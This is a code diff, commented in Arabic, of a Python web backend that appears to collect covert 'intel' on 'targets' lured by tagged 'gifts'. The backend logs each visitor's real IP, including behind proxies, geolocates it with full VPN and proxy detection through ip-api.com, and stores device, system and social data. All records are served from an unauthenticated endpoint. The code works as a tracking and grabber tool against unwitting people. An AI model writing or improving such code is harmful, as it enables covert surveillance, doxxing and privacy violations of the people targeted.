@@ -22,65 +22,57 @@ def get_db_conn():
 def setup_db():
     conn = get_db_conn()
     cur = conn.cursor()
-    # إنشاء الجدول الأساسي بكل الخانات المطلوبة
+    # إنشاء جدول مرن جداً يستوعب كل شيء JSON
     cur.execute("""
-        CREATE TABLE IF NOT EXISTS luvra_max_intel (
+        CREATE TABLE IF NOT EXISTS luvra_omega_intel (
             id SERIAL PRIMARY KEY,
             target_id TEXT,
             gift_tag TEXT,
             ip_address TEXT,
             geo_data JSONB,
-            hardware_data JSONB,
-            system_data JSONB,
-            social_data JSONB,
+            all_metrics JSONB,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         );
     """)
-    # تأكيد وجود عمود gift_tag يدوياً لضمان عدم حدوث Error
-    cur.execute("ALTER TABLE luvra_max_intel ADD COLUMN IF NOT EXISTS gift_tag TEXT;")
     conn.commit()
     cur.close()
     conn.close()
 
 @app.post("/api/v1/gate/collect")
 async def collect_intel(request: Request):
-    client_ip = request.client.host
+    # سحب الـ IP الحقيقي حتى لو خلف 10 جدران حماية
+    client_ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
     try:
         payload = await request.json()
-        # سحب بيانات الـ IP مع كشف البروكسي والـ VPN
-        geo = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,city,isp,proxy,hosting").json()
+        # سحب بيانات IP استخباراتية (كشف VPN, Proxy, Hosting, Mobile Data)
+        geo = requests.get(f"http://ip-api.com/json/{client_ip}?fields=16777215").json()
         
         conn = get_db_conn()
         cur = conn.cursor()
         cur.execute("""
-            INSERT INTO luvra_max_intel 
-            (target_id, gift_tag, ip_address, geo_data, hardware_data, system_data, social_data)
-            VALUES (%s, %s, %s, %s, %s, %s, %s)
+            INSERT INTO luvra_omega_intel (target_id, gift_tag, ip_address, geo_data, all_metrics)
+            VALUES (%s, %s, %s, %s, %s)
         """, (
             payload.get('target_id'),
             payload.get('gift_tag'),
             client_ip,
             json.dumps(geo),
-            json.dumps(payload.get('hardware')),
-            json.dumps(payload.get('system')),
-            json.dumps(payload.get('social_reach'))
+            json.dumps(payload)
         ))
         conn.commit()
         cur.close()
         conn.close()
         return {"status": "SUCCESS"}
     except Exception as e:
-        return {"status": "FAIL", "error": str(e)}
+        print(f"FAILED: {e}")
+        return {"status": "FAIL"}
 
 @app.get("/api/v1/analytics/full")
 async def get_all_data():
     conn = get_db_conn()
     cur = conn.cursor(cursor_factory=RealDictCursor)
-    cur.execute("SELECT * FROM luvra_max_intel ORDER BY created_at DESC")
+    cur.execute("SELECT * FROM luvra_omega_intel ORDER BY created_at DESC")
     data = cur.fetchall()
     cur.close()
     conn.close()
     return data
-
-@app.get("/health")
-def health(): return {"status": "online"}
